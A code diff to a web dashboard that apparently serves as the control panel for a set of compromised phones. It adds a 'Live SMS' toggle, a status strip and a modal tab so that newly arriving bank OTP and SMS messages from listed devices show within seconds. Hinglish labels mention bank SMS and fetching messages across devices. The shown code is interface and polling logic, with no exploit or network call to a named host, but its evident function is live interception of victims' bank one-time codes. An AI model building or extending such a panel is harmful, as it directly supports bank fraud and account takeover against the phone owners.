@@ -134,7 +134,20 @@
   .badge-pin-no { background: rgba(90,106,133,0.2); color: var(--muted); border: 1px solid rgba(90,106,133,0.35); font-size: 0.62rem; font-weight: 800; padding: 2px 8px; border-radius: 8px; }
   .live-preview { font-size: 0.7rem; color: #ffb74d; margin-top: 2px; line-height: 1.35; }
   .sms-card.live-flash { border-color: rgba(255,82,82,0.55); box-shadow: 0 0 0 1px rgba(255,82,82,0.25); }
-  .pill.live-on { background: rgba(255,82,82,0.12); border-color: rgba(255,82,82,0.45); color: #ff8a80; }
+  .pill.live-on, .btn.live-on, #liveSmsPill.live-on {
+    background: rgba(255,82,82,0.22); border-color: rgba(255,82,82,0.75); color: #ffab91;
+    box-shadow: 0 0 16px rgba(255,82,82,0.35); font-weight: 800;
+  }
+  .pill.live-off, .btn.live-off, #liveSmsPill.live-off {
+    background: rgba(90,106,133,0.15); border-color: var(--border); color: var(--muted);
+  }
+  .live-strip {
+    margin: 0 16px 10px; padding: 10px 14px; border-radius: 12px;
+    border: 1px solid rgba(255,82,82,0.35); background: rgba(255,82,82,0.08);
+    display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap;
+    font-size: 0.78rem;
+  }
+  .live-strip strong { color: #ff8a80; }
   .fetch-progress {
     display: none; margin: 0 16px 10px; padding: 8px 12px;
     background: var(--card); border: 1px solid var(--border); border-radius: 10px;
@@ -505,8 +518,14 @@
   <button class="pill" data-days="15">SMS 15d</button>
   <button class="pill" data-days="30">SMS 30d</button>
   <button class="pill" data-days="0">All time</button>
+  <button type="button" class="pill live-on" id="liveSmsPill" title="Naya OTP/SMS turant dikhega (purana ignore)">🔴 Live SMS ON</button>
   <button class="pill start-on" id="smsStartBtn">▶ Start Phase Fetch</button>
   <button class="pill stop-on" id="smsStopBtn" style="display:none">⏹ Stop Fetch</button>
+</div>
+
+<div class="live-strip" id="liveStrip">
+  <span><strong>📩 Live SMS</strong> — Fetch Live ke baad naya OTP yahan + device par dikhega</span>
+  <button type="button" class="pill live-on" id="liveSmsPill2">🔴 ON</button>
 </div>
 
 <div class="filter-active-bar" id="filterActiveBar">
@@ -1042,11 +1061,39 @@ function stopLivePolling() {
   if (livePollTimer) { clearInterval(livePollTimer); livePollTimer = null; }
 }
 
+function setLiveSmsEnabled(on) {
+  liveSmsOn = on;
+  updateLiveToggleUi();
+  if (liveSmsOn && allDevices.length) startLivePolling();
+  else stopLivePolling();
+}
+
+function toggleLiveSms() {
+  setLiveSmsEnabled(!liveSmsOn);
+  toast(liveSmsOn ? 'Live SMS ON — naya OTP ab dikhega' : 'Live SMS OFF');
+  if (liveSmsOn && allDevices.length) resetLiveBaselines(getFetchScanPool().length ? getFetchScanPool() : allDevices);
+}
+
 function updateLiveToggleUi() {
-  const btn = document.getElementById('liveSmsToggle');
-  if (!btn) return;
-  btn.classList.toggle('live-on', liveSmsOn);
-  btn.textContent = liveSmsOn ? '🔴 Live SMS ON' : '⚪ Live SMS OFF';
+  const label = liveSmsOn ? '🔴 Live SMS ON' : '⚪ Live SMS OFF';
+  const short = liveSmsOn ? '🔴 ON' : '⚪ OFF';
+  for (const id of ['liveSmsToggle', 'liveSmsPill', 'liveSmsPill2']) {
+    const btn = document.getElementById(id);
+    if (!btn) continue;
+    btn.classList.toggle('live-on', liveSmsOn);
+    btn.classList.toggle('live-off', !liveSmsOn);
+    btn.textContent = id === 'liveSmsPill2' ? short : (id === 'liveSmsPill' ? label : label);
+  }
+  const strip = document.getElementById('liveStrip');
+  if (strip) {
+    strip.style.display = allDevices.length ? 'flex' : 'none';
+    const span = strip.querySelector('span');
+    if (span) {
+      span.innerHTML = liveSmsOn
+        ? '<strong>📩 Live SMS ON</strong> — naya OTP/SMS ~4 sec mein list + device 📩 Live new tab'
+        : '<strong>Live SMS OFF</strong> — tap 🔴 ON karo, phir Fetch Live';
+    }
+  }
 }
 
 function smsFetchWantAll(wantAll = false) {
@@ -2163,7 +2210,7 @@ function renderDeviceRow(d, rank) {
       <div><span class="lbl">Status : </span><span class="val ${statusCls}">${statusTxt}</span></div>
     </div>
     <div class="drow-actions">
-      <button type="button" class="drow-act info" data-open="${d._idx}" title="Bank SMS">ℹ️</button>
+      <button type="button" class="drow-act info" data-open="${d._idx}" title="Bank + Live SMS">📩</button>
       <button type="button" class="drow-act star${starOn}" data-star="${d.id}" title="Star">★</button>
     </div>
   </div>`;
@@ -2273,6 +2320,7 @@ function updateStats(list) {
 function render() {
   const list = getFiltered();
   updateStats(list);
+  updateLiveToggleUi();
 
   const grid = document.getElementById('grid');
   if (!allDevices.length) {
@@ -2361,7 +2409,7 @@ function openDev(idx) {
   openModalIdx = idx;
   modalIsOpen = true;
   modalClosing = false;
-  modalTab = 'all';
+  modalTab = liveSmsOn ? 'live' : 'all';
   modalDays = 0;
   lastModalHtml = '';
   lockBodyScroll();
@@ -2669,12 +2717,8 @@ document.getElementById('filterChips')?.addEventListener('click', e => {
   updateFetchProgress();
 });
 
-document.getElementById('liveSmsToggle')?.addEventListener('click', () => {
-  liveSmsOn = !liveSmsOn;
-  updateLiveToggleUi();
-  if (liveSmsOn && allDevices.length) startLivePolling();
-  else stopLivePolling();
-  toast(liveSmsOn ? 'Live SMS ON' : 'Live SMS OFF');
+['liveSmsToggle', 'liveSmsPill', 'liveSmsPill2'].forEach(id => {
+  document.getElementById(id)?.addEventListener('click', toggleLiveSms);
 });
 document.querySelectorAll('[data-days]').forEach(b => b.addEventListener('click', () => {
   globalSmsDays = Number(b.dataset.days);
